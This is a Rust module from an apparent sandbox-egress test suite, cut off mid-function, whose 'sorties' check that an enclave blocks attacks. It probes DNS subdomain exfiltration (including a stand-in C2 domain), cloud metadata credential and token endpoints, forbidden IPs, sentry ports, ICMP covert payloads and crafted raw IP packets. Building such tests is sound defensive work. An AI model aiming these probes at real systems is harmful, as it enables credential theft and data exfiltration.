// Copyright 2026 Scale Invariant, Inc.
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// Author: Brad Hyslop <bhyslop@scaleinvariant.org>
//
// RBIDA_SORTIES — ported python sorties (rbtis_*.py) as ifrit attack variants
//
// Each sortie was originally a python module in Tools/rbk/rbtid/. This module
// reproduces the same security checks in Rust, producing a single rbida_Verdict
// (PASS if all sub-checks pass, FAIL on first failure).
//
// Faithful port: same attack surfaces, same verdicts. Env vars read from
// container environment (injected from nameplate via compose).

use std::io::{Read as IoRead, Write as IoWrite};
use std::mem::MaybeUninit;
use std::net::{Ipv4Addr, SocketAddr, SocketAddrV4, TcpStream, UdpSocket};
use std::os::unix::io::AsRawFd;
use std::process::Command;
use std::time::{Duration, Instant};

use crate::rbida_attacks::{rbida_Verdict, RBIDA_CONNECTIVITY_DOMAIN};

const RBIDA_HTTP_BODY_MARKER_INTERNIC: &str = "InterNIC";

// ── Helpers ──────────────────────────────────────────────────

fn env_require(name: &str) -> Result<String, String> {
    std::env::var(name).map_err(|_| format!("missing env var: {}", name))
}

fn fail(detail: String) -> rbida_Verdict {
    rbida_Verdict {
        passed: false,
        detail,
    }
}

fn pass(detail: String) -> rbida_Verdict {
    rbida_Verdict {
        passed: true,
        detail,
    }
}

fn random_hex(n: usize) -> String {
    let mut buf = vec![0u8; (n + 1) / 2];
    if let Ok(mut f) = std::fs::File::open("/dev/urandom") {
        let _ = IoRead::read_exact(&mut f, &mut buf);
    }
    let hex: String = buf.iter().map(|b| format!("{:02x}", b)).collect();
    hex[..n.min(hex.len())].to_string()
}

/// Resolve a name via dig +short, return first IP or None.
fn dig_resolve(name: &str) -> Option<String> {
    let output = Command::new("dig")
        .args(["+short", "A", name])
        .output()
        .ok()?;
    let stdout = String::from_utf8_lossy(&output.stdout);
    for line in stdout.lines() {
        let trimmed = line.trim();
        if !trimmed.is_empty()
            && trimmed
                .chars()
                .next()
                .map_or(false, |c| c.is_ascii_digit())
        {
            return Some(trimmed.to_string());
        }
    }
    None
}

/// TCP connect probe. Returns (connected, refused, error_msg).
fn tcp_probe(host: &str, port: u16, timeout: Duration) -> (bool, bool, Option<String>) {
    let addr: SocketAddr = match format!("{}:{}", host, port).parse() {
        Ok(a) => a,
        Err(e) => return (false, false, Some(e.to_string())),
    };
    match TcpStream::connect_timeout(&addr, timeout) {
        Ok(_) => (true, false, None),
        Err(e) => {
            let msg = e.to_string();
            let refused = msg.contains("refused") || msg.contains("reset");
            (false, refused, Some(msg))
        }
    }
}

/// Minimal HTTP GET via raw TCP. Returns (connected, status_code, error).
fn http_get_raw(
    host: &str,
    port: u16,
    path: &str,
    headers: &[(&str, &str)],
    timeout: Duration,
) -> (bool, Option<u16>, Option<String>) {
    let addr: SocketAddr = match format!("{}:{}", host, port).parse() {
        Ok(a) => a,
        Err(e) => return (false, None, Some(e.to_string())),
    };
    match TcpStream::connect_timeout(&addr, timeout) {
        Ok(mut stream) => {
            let _ = stream.set_read_timeout(Some(timeout));
            let _ = stream.set_write_timeout(Some(timeout));
            let mut req = format!("GET {} HTTP/1.0\r\nHost: {}\r\n", path, host);
            for (k, v) in headers {
                req.push_str(&format!("{}: {}\r\n", k, v));
            }
            req.push_str("\r\n");
            if stream.write_all(req.as_bytes()).is_err() {
                return (true, None, Some("write failed".to_string()));
            }
            let mut resp = Vec::new();
            let _ = stream.read_to_end(&mut resp);
            if resp.is_empty() {
                return (true, None, Some("empty response".to_string()));
            }
            let head = String::from_utf8_lossy(&resp[..resp.len().min(200)]);
            let status = head
                .split_whitespace()
                .nth(1)
                .and_then(|s| s.parse::<u16>().ok());
            (true, status, None)
        }
        Err(e) => (false, None, Some(e.to_string())),
    }
}

/// IP/ICMP checksum computation.
fn ip_checksum(data: &[u8]) -> u16 {
    let mut sum = 0u32;
    let mut i = 0;
    while i + 1 < data.len() {
        sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        i += 2;
    }
    if i < data.len() {
        sum += (data[i] as u32) << 8;
    }
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    !(sum as u16)
}

/// Cast a &mut [u8] to &mut [MaybeUninit<u8>] for socket2 recv.
fn as_uninit(buf: &mut [u8]) -> &mut [MaybeUninit<u8>] {
    unsafe { std::slice::from_raw_parts_mut(buf.as_mut_ptr() as *mut MaybeUninit<u8>, buf.len()) }
}

/// Build ICMP echo request packet with payload.
fn build_icmp_echo(payload: &[u8], seq: u16) -> Vec<u8> {
    let ident = std::process::id() as u16;
    let mut pkt = Vec::with_capacity(8 + payload.len());
    pkt.push(8); // type: echo request
    pkt.push(0); // code
    pkt.extend_from_slice(&[0, 0]); // checksum placeholder
    pkt.extend_from_slice(&ident.to_be_bytes());
    pkt.extend_from_slice(&seq.to_be_bytes());
    pkt.extend_from_slice(payload);
    let cksum = ip_checksum(&pkt);
    pkt[2..4].copy_from_slice(&cksum.to_be_bytes());
    pkt
}

/// Send ICMP echo request and wait for reply. Returns Ok(replied).
fn send_icmp(dest: &str, payload: &[u8], seq: u16, timeout: Duration) -> Result<bool, String> {
    let dest_addr: Ipv4Addr = dest.parse().map_err(|e| format!("bad IP: {}", e))?;
    let sock_addr = socket2::SockAddr::from(SocketAddrV4::new(dest_addr, 0));
    let socket = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_ICMP as i32)),
    )
    .map_err(|e| format!("ICMP socket: {}", e))?;
    socket
        .set_read_timeout(Some(timeout))
        .map_err(|e| format!("timeout: {}", e))?;

    let pkt = build_icmp_echo(payload, seq);
    socket
        .send_to(&pkt, &sock_addr)
        .map_err(|e| format!("sendto: {}", e))?;

    let ident = std::process::id() as u16;
    let mut buf = [0u8; 4096];
    let deadline = Instant::now() + timeout;
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            return Ok(false);
        }
        let _ = socket.set_read_timeout(Some(remaining));
        match socket.recv_from(as_uninit(&mut buf)) {
            Ok((n, _)) if n >= 28 => {
                if buf[20] == 0 && u16::from_be_bytes([buf[24], buf[25]]) == ident {
                    return Ok(true); // Echo reply with matching ID
                }
            }
            Ok(_) => {}
            Err(e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut =>
            {
                return Ok(false);
            }
            Err(e) => return Err(format!("recv: {}", e)),
        }
    }
}

/// Send ICMP timestamp request (type 13) and check for reply (type 14).
fn send_icmp_timestamp(dest: &str, timeout: Duration) -> Result<bool, String> {
    let dest_addr: Ipv4Addr = dest.parse().map_err(|e| format!("bad IP: {}", e))?;
    let sock_addr = socket2::SockAddr::from(SocketAddrV4::new(dest_addr, 0));
    let socket = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_ICMP as i32)),
    )
    .map_err(|e| format!("ICMP socket: {}", e))?;
    socket
        .set_read_timeout(Some(timeout))
        .map_err(|e| format!("timeout: {}", e))?;

    let ident = std::process::id() as u16;
    let ts = std::time::SystemTime::now()
        .duration_since(std::time::SystemTime::UNIX_EPOCH)
        .unwrap_or_default()
        .as_secs() as u32;
    let mut pkt = Vec::with_capacity(20);
    pkt.push(13); // timestamp request
    pkt.push(0);
    pkt.extend_from_slice(&[0, 0]); // checksum placeholder
    pkt.extend_from_slice(&ident.to_be_bytes());
    pkt.extend_from_slice(&1u16.to_be_bytes());
    pkt.extend_from_slice(&ts.to_be_bytes());
    pkt.extend_from_slice(&0u32.to_be_bytes());
    pkt.extend_from_slice(&0u32.to_be_bytes());
    let cksum = ip_checksum(&pkt);
    pkt[2..4].copy_from_slice(&cksum.to_be_bytes());

    socket
        .send_to(&pkt, &sock_addr)
        .map_err(|e| format!("sendto: {}", e))?;

    let mut buf = [0u8; 4096];
    match socket.recv_from(as_uninit(&mut buf)) {
        Ok((n, _)) if n > 20 => Ok(buf[20] == 14),
        _ => Ok(false),
    }
}

/// Build an IPv4 header for raw IP_HDRINCL packets.
fn build_ip_header(proto: u8, src: &str, dst: &str, payload_len: usize) -> Result<Vec<u8>, String> {
    let src_ip: Ipv4Addr = src.parse().map_err(|e| format!("bad src IP: {}", e))?;
    let dst_ip: Ipv4Addr = dst.parse().map_err(|e| format!("bad dst IP: {}", e))?;
    let total_len = 20u16 + payload_len as u16;
    let ident_bytes = random_hex(4);
    let ident = u16::from_str_radix(&ident_bytes, 16).unwrap_or(0x1234);

    let mut hdr = Vec::with_capacity(20);
    hdr.push(0x45); // version + IHL
    hdr.push(0); // TOS
    hdr.extend_from_slice(&total_len.to_be_bytes());
    hdr.extend_from_slice(&ident.to_be_bytes());
    hdr.extend_from_slice(&0x4000u16.to_be_bytes()); // DF
    hdr.push(64); // TTL
    hdr.push(proto);
    hdr.extend_from_slice(&[0, 0]); // checksum placeholder
    hdr.extend_from_slice(&src_ip.octets());
    hdr.extend_from_slice(&dst_ip.octets());
    let cksum = ip_checksum(&hdr);
    hdr[10..12].copy_from_slice(&cksum.to_be_bytes());
    Ok(hdr)
}

/// Build TCP SYN segment (20 bytes, no options).
fn build_tcp_syn(src_port: u16, dst_port: u16) -> Vec<u8> {
    let seq_bytes = random_hex(8);
    let seq = u32::from_str_radix(&seq_bytes, 16).unwrap_or(0x41414141);
    let data_offset_flags: u16 = (5 << 12) | 0x002; // SYN
    let mut seg = Vec::with_capacity(20);
    seg.extend_from_slice(&src_port.to_be_bytes());
    seg.extend_from_slice(&dst_port.to_be_bytes());
    seg.extend_from_slice(&seq.to_be_bytes());
    seg.extend_from_slice(&0u32.to_be_bytes()); // ACK
    seg.extend_from_slice(&data_offset_flags.to_be_bytes());
    seg.extend_from_slice(&65535u16.to_be_bytes()); // window
    seg.extend_from_slice(&0u16.to_be_bytes()); // checksum
    seg.extend_from_slice(&0u16.to_be_bytes()); // urgent
    seg
}

/// Send a raw IP_HDRINCL packet and listen for TCP response.
fn send_raw_ip_and_listen(
    packet: &[u8],
    dst: &str,
    timeout: Duration,
) -> Result<bool, String> {
    let dst_addr: Ipv4Addr = dst.parse().map_err(|e| format!("bad IP: {}", e))?;
    let sock_addr = socket2::SockAddr::from(SocketAddrV4::new(dst_addr, 0));

    // Send with IP_HDRINCL
    let send_sock = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_RAW as i32)),
    )
    .map_err(|e| format!("raw socket: {}", e))?;
    unsafe {
        let val: libc::c_int = 1;
        libc::setsockopt(
            send_sock.as_raw_fd(),
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &val as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        );
    }
    send_sock
        .send_to(packet, &sock_addr)
        .map_err(|e| format!("sendto: {}", e))?;

    // Listen for TCP response
    let listen_sock = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_TCP as i32)),
    )
    .map_err(|e| format!("listen socket: {}", e))?;
    listen_sock
        .set_read_timeout(Some(timeout))
        .map_err(|e| format!("timeout: {}", e))?;

    let mut buf = [0u8; 4096];
    let deadline = Instant::now() + timeout;
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            return Ok(false);
        }
        let _ = listen_sock.set_read_timeout(Some(remaining));
        match listen_sock.recv_from(as_uninit(&mut buf)) {
            Ok((n, addr)) => {
                let from_ip = addr
                    .as_socket_ipv4()
                    .map(|a| a.ip().to_string())
                    .unwrap_or_default();
                if from_ip == dst && n > 20 {
                    return Ok(true); // Got a TCP response from destination
                }
            }
            Err(e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut =>
            {
                return Ok(false);
            }
            Err(_) => return Ok(false),
        }
    }
}

/// Send a raw protocol packet (not IP_HDRINCL) and listen for response.
fn send_raw_proto(
    dest: &str,
    proto: i32,
    payload: &[u8],
    timeout: Duration,
) -> Result<bool, String> {
    let dest_addr: Ipv4Addr = dest.parse().map_err(|e| format!("bad IP: {}", e))?;
    let sock_addr = socket2::SockAddr::from(SocketAddrV4::new(dest_addr, 0));

    let socket = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(proto)),
    )
    .map_err(|e| format!("raw socket proto {}: {}", proto, e))?;
    socket
        .set_read_timeout(Some(timeout))
        .map_err(|e| format!("timeout: {}", e))?;

    socket
        .send_to(payload, &sock_addr)
        .map_err(|e| format!("sendto: {}", e))?;

    let mut buf = [0u8; 4096];
    match socket.recv_from(as_uninit(&mut buf)) {
        Ok((_, addr)) => {
            let from_ip = addr
                .as_socket_ipv4()
                .map(|a| a.ip().to_string())
                .unwrap_or_default();
            Ok(from_ip == dest)
        }
        Err(_) => Ok(false),
    }
}

/// Build an IP fragment with IP_HDRINCL.
fn build_ip_fragment(
    src: &str,
    dst: &str,
    proto: u8,
    payload: &[u8],
    ident: u16,
    frag_offset: u16,
    more_fragments: bool,
) -> Result<Vec<u8>, String> {
    let src_ip: Ipv4Addr = src.parse().map_err(|e| format!("bad src: {}", e))?;
    let dst_ip: Ipv4Addr = dst.parse().map_err(|e| format!("bad dst: {}", e))?;
    let total_len = 20u16 + payload.len() as u16;
    let mut flags_frag = frag_offset & 0x1FFF;
    if more_fragments {
        flags_frag |= 0x2000;
    }

    let mut hdr = Vec::with_capacity(20 + payload.len());
    hdr.push(0x45);
    hdr.push(0);
    hdr.extend_from_slice(&total_len.to_be_bytes());
    hdr.extend_from_slice(&ident.to_be_bytes());
    hdr.extend_from_slice(&flags_frag.to_be_bytes());
    hdr.push(64);
    hdr.push(proto);
    hdr.extend_from_slice(&[0, 0]); // checksum placeholder
    hdr.extend_from_slice(&src_ip.octets());
    hdr.extend_from_slice(&dst_ip.octets());
    let cksum = ip_checksum(&hdr);
    hdr[10..12].copy_from_slice(&cksum.to_be_bytes());
    hdr.extend_from_slice(payload);
    Ok(hdr)
}

/// Send a list of IP fragments via raw socket and listen for TCP response.
fn send_fragments_and_listen(
    dst: &str,
    fragments: &[Vec<u8>],
    timeout: Duration,
) -> Result<bool, String> {
    let dst_addr: Ipv4Addr = dst.parse().map_err(|e| format!("bad IP: {}", e))?;
    let sock_addr = socket2::SockAddr::from(SocketAddrV4::new(dst_addr, 0));

    let send_sock = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_RAW as i32)),
    )
    .map_err(|e| format!("raw socket: {}", e))?;
    unsafe {
        let val: libc::c_int = 1;
        libc::setsockopt(
            send_sock.as_raw_fd(),
            libc::IPPROTO_IP,
            libc::IP_HDRINCL,
            &val as *const _ as *const libc::c_void,
            std::mem::size_of::<libc::c_int>() as libc::socklen_t,
        );
    }
    for frag in fragments {
        send_sock
            .send_to(frag, &sock_addr)
            .map_err(|e| format!("sendto: {}", e))?;
    }

    let listen_sock = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_TCP as i32)),
    )
    .map_err(|e| format!("listen socket: {}", e))?;
    listen_sock
        .set_read_timeout(Some(timeout))
        .map_err(|e| format!("timeout: {}", e))?;

    let mut buf = [0u8; 4096];
    let deadline = Instant::now() + timeout;
    loop {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            return Ok(false);
        }
        let _ = listen_sock.set_read_timeout(Some(remaining));
        match listen_sock.recv_from(as_uninit(&mut buf)) {
            Ok((_, addr)) => {
                let from_ip = addr
                    .as_socket_ipv4()
                    .map(|a| a.ip().to_string())
                    .unwrap_or_default();
                if from_ip == dst {
                    return Ok(true);
                }
            }
            Err(e)
                if e.kind() == std::io::ErrorKind::WouldBlock
                    || e.kind() == std::io::ErrorKind::TimedOut =>
            {
                return Ok(false);
            }
            Err(_) => return Ok(false),
        }
    }
}

/// Get IPv6 addresses by scope via `ip -6 addr show scope <scope>`.
fn get_ipv6_addrs(scope: &str) -> Vec<String> {
    let mut addrs = Vec::new();
    if let Ok(output) = Command::new("ip")
        .args(["-6", "addr", "show", "scope", scope])
        .output()
    {
        let stdout = String::from_utf8_lossy(&output.stdout);
        for line in stdout.lines() {
            let trimmed = line.trim();
            if let Some(rest) = trimmed.strip_prefix("inet6 ") {
                if let Some(addr) = rest.split_whitespace().next() {
                    if let Some(ip) = addr.split('/').next() {
                        addrs.push(ip.to_string());
                    }
                }
            }
        }
    }
    addrs
}

/// Check if ip6tables has DROP default policies.
fn check_ip6tables_drop() -> bool {
    if let Ok(output) = Command::new("ip6tables")
        .args(["-L", "-n"])
        .output()
    {
        let stdout = String::from_utf8_lossy(&output.stdout);
        stdout.contains("policy DROP")
    } else {
        false
    }
}

/// Get interface name and MAC from /sys/class/net/.
fn get_interface_info() -> Option<(String, String)> {
    let entries = std::fs::read_dir("/sys/class/net").ok()?;
    for entry in entries.flatten() {
        let name = entry.file_name().to_string_lossy().to_string();
        if !name.starts_with("eth") {
            continue;
        }
        let mac_path = format!("/sys/class/net/{}/address", name);
        if let Ok(mac) = std::fs::read_to_string(&mac_path) {
            let mac = mac.trim().to_string();
            // Valid Ethernet MAC: 6 octets = exactly 5 colons
            if mac.matches(':').count() == 5 && mac != "00:00:00:00:00:00" {
                return Some((name, mac));
            }
        }
    }
    None
}

/// Get sentry MAC from /proc/net/arp.
fn get_sentry_mac(sentry_ip: &str) -> Option<String> {
    // Ping to ensure ARP entry
    let _ = Command::new("ping")
        .args(["-c", "1", "-W", "1", sentry_ip])
        .output();

    let content = std::fs::read_to_string("/proc/net/arp").ok()?;
    for line in content.lines() {
        let parts: Vec<&str> = line.split_whitespace().collect();
        if parts.first() == Some(&sentry_ip) && parts.len() >= 4 {
            let mac = parts[3];
            if mac != "00:00:00:00:00:00" {
                return Some(mac.to_string());
            }
        }
    }
    None
}

/// Convert "aa:bb:cc:dd:ee:ff" to 6-byte array.
fn mac_to_bytes(mac: &str) -> Result<[u8; 6], String> {
    let parts: Vec<&str> = mac.split(':').collect();
    if parts.len() != 6 {
        return Err(format!("invalid MAC: {}", mac));
    }
    let mut bytes = [0u8; 6];
    for (i, part) in parts.iter().enumerate() {
        bytes[i] = u8::from_str_radix(part, 16).map_err(|_| format!("invalid MAC byte: {}", part))?;
    }
    Ok(bytes)
}

// ── Sortie 1: dns_exfil_subdomain ────────────────────────────

pub fn sortie_dns_exfil_subdomain(_extra_args: &[&str]) -> rbida_Verdict {
    let domains_str = match env_require("RBRN_UPLINK_ALLOWED_DOMAINS") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let domains: Vec<&str> = domains_str.split_whitespace().collect();
    if domains.is_empty() {
        return fail("ERROR: RBRN_UPLINK_ALLOWED_DOMAINS is empty".to_string());
    }

    // Resolve parent domains to get baseline frozen IPs
    let mut parent_ips: Vec<(&str, String)> = Vec::new();
    for domain in &domains {
        match dig_resolve(domain) {
            Some(ip) => parent_ips.push((domain, ip)),
            None => {
                return fail(format!(
                    "ERROR: cannot resolve parent domain {} — DNS may be down",
                    domain
                ))
            }
        }
    }

    // Fabricated subdomains — must resolve to parent IP (local config) not NXDOMAIN (forwarded)
    for (domain, parent_ip) in &parent_ips {
        let nonce = random_hex(12);
        let fabricated = format!("exfil-{}.{}", nonce, domain);
        match dig_resolve(&fabricated) {
            Some(ref ip) if ip == parent_ip => {} // Local config answer — SECURE
            Some(ip) => {
                return fail(format!(
                    "BREACH: {} -> {} (expected {}) — subdomain forwarded upstream",
                    fabricated, ip, parent_ip
                ))
            }
            None => {
                return fail(format!(
                    "BREACH: {} -> NXDOMAIN — query forwarded upstream, data exfiltrated in subdomain labels",
                    fabricated
                ))
            }
        }
    }

    // Encoded payload subdomain — simulates actual data exfiltration
    let payload_label = random_hex(32);
    let nonce = random_hex(8);
    let test_domain = domains[0];
    let encoded_fqdn = format!("{}.{}.{}", payload_label, nonce, test_domain);
    let parent_ip = &parent_ips[0].1;
    match dig_resolve(&encoded_fqdn) {
        Some(ref ip) if ip == parent_ip => {}
        _ => {
            return fail(format!(
                "BREACH: {} — payload reached upstream (exfiltration channel open)",
                encoded_fqdn
            ))
        }
    }

    // Control — non-allowed domain should get NXDOMAIN
    if dig_resolve("evil-c2-server.invalid").is_some() {
        return fail("BREACH: non-allowed domain resolved — allowlist broken".to_string());
    }

    pass("SECURE: DNS subdomain exfiltration channel closed — all queries answered locally".to_string())
}

// ── Sortie 2: meta_cloud_endpoint ────────────────────────────

pub fn sortie_meta_cloud_endpoint(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let metadata_ip = "169.254.169.254";
    let timeout = Duration::from_secs(3);

    // TCP connect to metadata IP
    let (connected, _, _) = tcp_probe(metadata_ip, 80, timeout);
    if connected {
        return fail(format!(
            "BREACH: TCP connect to {}:80 succeeded — metadata endpoint reachable",
            metadata_ip
        ));
    }

    // Probe cloud provider metadata paths
    let probes: &[(&str, &str, &[(&str, &str)])] = &[
        ("GCP metadata", "/computeMetadata/v1/", &[("Metadata-Flavor", "Google")]),
        ("GCP project ID", "/computeMetadata/v1/project/project-id", &[("Metadata-Flavor", "Google")]),
        ("GCP SA token", "/computeMetadata/v1/instance/service-accounts/default/token", &[("Metadata-Flavor", "Google")]),
        ("AWS metadata", "/latest/meta-data/", &[]),
        ("AWS IAM creds", "/latest/meta-data/iam/security-credentials/", &[]),
        ("Azure metadata", "/metadata/instance?api-version=2021-02-01", &[("Metadata", "true")]),
    ];
    for (label, path, headers) in probes {
        let (_, status, _) = http_get_raw(metadata_ip, 80, path, headers, timeout);
        if let Some(code) = status {
            if matches!(code, 200 | 301 | 302 | 401 | 403) {
                return fail(format!(
                    "BREACH: {} HTTP {} — metadata endpoint responded",
                    label, code
                ));
            }
        }
    }

    // Alternate metadata ports
    for port in [8080u16, 8775] {
        let (connected, _, _) = tcp_probe(metadata_ip, port, Duration::from_secs(2));
        if connected {
            return fail(format!(
                "BREACH: TCP {}:{} connected — alternate metadata port open",
                metadata_ip, port
            ));
        }
    }

    // HTTP proxy via sentry to metadata
    let (_, status, _) = http_get_raw(
        &sentry_ip,
        80,
        &format!("http://{}/", metadata_ip),
        &[],
        Duration::from_secs(2),
    );
    if let Some(code) = status {
        if matches!(code, 200 | 301 | 302) {
            return fail(format!(
                "BREACH: HTTP proxy via sentry to metadata succeeded (status {})",
                code
            ));
        }
    }

    pass("SECURE: cloud metadata endpoint unreachable from enclave".to_string())
}

// ── Sortie 3: net_forbidden_cidr ─────────────────────────────

pub fn sortie_net_forbidden_cidr(_extra_args: &[&str]) -> rbida_Verdict {
    let timeout = Duration::from_secs(3);

    // TCP to forbidden destinations
    let forbidden_tcp: &[(&str, u16, &str)] = &[
        ("8.8.8.8", 53, "Google DNS"),
        ("1.1.1.1", 443, "Cloudflare"),
        ("93.184.216.34", 80, "IANA example block"),
        ("140.82.121.4", 443, "GitHub"),
    ];
    for (host, port, label) in forbidden_tcp {
        let (connected, refused, _) = tcp_probe(host, *port, timeout);
        if connected || refused {
            return fail(format!(
                "BREACH: TCP {}:{} ({}) — {} (packet escaped enclave)",
                host,
                port,
                label,
                if connected { "CONNECTED" } else { "REFUSED" }
            ));
        }
    }

    // UDP to forbidden destinations
    let dns_probe_payload =
        b"\xAA\xBB\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00\x07example\x03com\x00\x00\x01\x00\x01";
    for (host, label) in &[("8.8.8.8", "Google DNS UDP"), ("1.1.1.1", "Cloudflare DNS UDP")] {
        if let Ok(addr) = format!("{}:53", host).parse::<SocketAddr>() {
            if let Ok(sock) = UdpSocket::bind("0.0.0.0:0") {
                let _ = sock.set_read_timeout(Some(timeout));
                let _ = sock.send_to(dns_probe_payload, addr);
                let mut buf = [0u8; 4096];
                if sock.recv_from(&mut buf).is_ok() {
                    return fail(format!(
                        "BREACH: UDP {}:53 ({}) — response received (packet escaped)",
                        host, label
                    ));
                }
            }
        }
    }

    // Additional forbidden cloud IPs on 443
    for (host, label) in &[("52.20.0.1", "AWS us-east-1"), ("35.190.0.1", "GCP frontend")] {
        let (connected, refused, _) = tcp_probe(host, 443, timeout);
        if connected || refused {
            return fail(format!(
                "BREACH: TCP {}:443 ({}) — packet escaped enclave",
                host, label
            ));
        }
    }

    pass("SECURE: CIDR allowlist enforced — all forbidden destinations blocked".to_string())
}

// ── Sortie 4: direct_sentry_probe ────────────────────────────

pub fn sortie_direct_sentry_probe(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let entry_port: u16 = match env_require("RBRN_ENTRY_PORT_WORKSTATION") {
        Ok(v) => match v.parse() {
            Ok(p) => p,
            Err(_) => return fail(format!("ERROR: bad RBRN_ENTRY_PORT_WORKSTATION: {}", v)),
        },
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let timeout = Duration::from_secs(2);

    // Port scan — only port 53 should be open
    let scan_ports: &[u16] = &[
        21, 22, 23, 25, 80, 111, 135, 139, 443, 445, 993, 995, 2222, 3306, 3389, 5432, 5900,
        6379, 8080, 8443, 8888, 9090, 9200, 27017,
    ];
    let mut unexpected_ports = Vec::new();
    for &port in scan_ports {
        let (connected, _, _) = tcp_probe(&sentry_ip, port, timeout);
        if connected && port != 53 {
            unexpected_ports.push(port);
        }
    }
    if !unexpected_ports.is_empty() {
        return fail(format!(
            "BREACH: sentry has unexpected open ports: {:?}",
            unexpected_ports
        ));
    }

    // Entry port should not be accessible from enclave
    let (entry_open, _, _) = tcp_probe(&sentry_ip, entry_port, timeout);
    if entry_open {
        return fail(format!(
            "BREACH: entry port {}:{} accessible from enclave — DNAT leaking inward",
            sentry_ip, entry_port
        ));
    }

    // High ports on sentry
    let mut high_open = Vec::new();
    for &port in &[4096u16, 5353, 8053, 10000, 10053] {
        let (connected, _, _) = tcp_probe(&sentry_ip, port, timeout);
        if connected {
            high_open.push(port);
        }
    }
    if !high_open.is_empty() {
        return fail(format!(
            "BREACH: sentry has unexpected high ports open: {:?}",
            high_open
        ));
    }

    pass("SECURE: sentry exposes only DNS — minimal attack surface".to_string())
}

// ── Sortie 5: icmp_exfil_payload ─────────────────────────────

pub fn sortie_icmp_exfil_payload(_extra_args: &[&str]) -> rbida_Verdict {
    let sentry_ip = match env_require("RBRN_ENCLAVE_SENTRY_IP") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let cidrs_str = match env_require("RBRN_UPLINK_ALLOWED_CIDRS") {
        Ok(v) => v,
        Err(e) => return fail(format!("ERROR: {}", e)),
    };
    let allowed_cidr_ip = cidrs_str
        .split(',')
        .next()
        .unwrap_or("")
        .split('/')
        .next()
        .unwrap_or("");
    let external_ip = "8.8.8.8";
    let timeout = Duration::from_secs(3);
    let secret = b"EXFIL:ifrit-escaped-via-icmp-payload-encoding";

    // ICMP to sentry should work (enclave ICMP allowed)
    match send_icmp(&sentry_ip, secret, 1, timeout) {
        Ok(replied) => {
            if !replied {
                return fail("ERROR: ICMP echo to sentry got no reply — enclave ICMP broken".to_string());
            }
        }
        Err(e) => return fail(format!("ERROR: ICMP to sentry: {}", e)),
    }

    // ICMP to external should be blocked
    match send_icmp(external_ip, secret, 3, timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: ICMP echo to {} got reply — ICMP escaped enclave boundary",
                    external_ip
                ));
            }
        }
        Err(_) => {} // Permission denied or socket error is acceptable
    }

    // ICMP to allowed CIDR should also be blocked (FORWARD drops ICMP)
    if !allowed_cidr_ip.is_empty() {
        match send_icmp(allowed_cidr_ip, secret, 4, timeout) {
            Ok(replied) => {
                if replied {
                    return fail(format!(
                        "BREACH: ICMP echo to allowed CIDR {} got reply — ICMP forwarded to uplink",
                        allowed_cidr_ip
                    ));
                }
            }
            Err(_) => {}
        }
    }

    // ICMP timestamp to external should be blocked
    match send_icmp_timestamp(external_ip, timeout) {
        Ok(replied) => {
            if replied {
                return fail(format!(
                    "BREACH: ICMP timestamp to {} got reply — non-echo ICMP type escaped",
                    external_ip
                ));
            }
        }
        Err(_) => {}
    }

    pass("SECURE: ICMP covert channel blocked — no ICMP escapes enclave boundary".to_string())
}

// ── Sortie 6: net_ipv6_escape ────────────────────────────────

pub fn sortie_net_ipv6_escape(_extra_args: &[&str]) -> rbida_Verdict {
    let timeout = Duration::from_secs(3);

    // Check for IPv6 global addresses (informational)
    let global_addrs = get_ipv6_addrs("global");
    if !global_addrs.is_empty() {
        // Global IPv6 present — need ip6tables hardened
        if !check_ip6tables_drop() {
            // ip6tables not hardened — check if IPv6 actually works
        }
    }

    // IPv6 TCP to external destinations
    let targets: &[(&str, u16, &str)] = &[
        ("2001:4860:4860::8888", 53, "Google DNS IPv6"),
        ("2606:4700:4700::1111", 443, "Cloudflare IPv6"),
        ("2001:4860:4860::8844", 53, "Google DNS IPv6 secondary"),
    ];
    for (host, port, label) in targets {
        // Try IPv6 TCP connect
        let addr_str = format!("[{}]:{}", host, port);
        if let Ok(addr) = addr_str.parse::<SocketAddr>() {
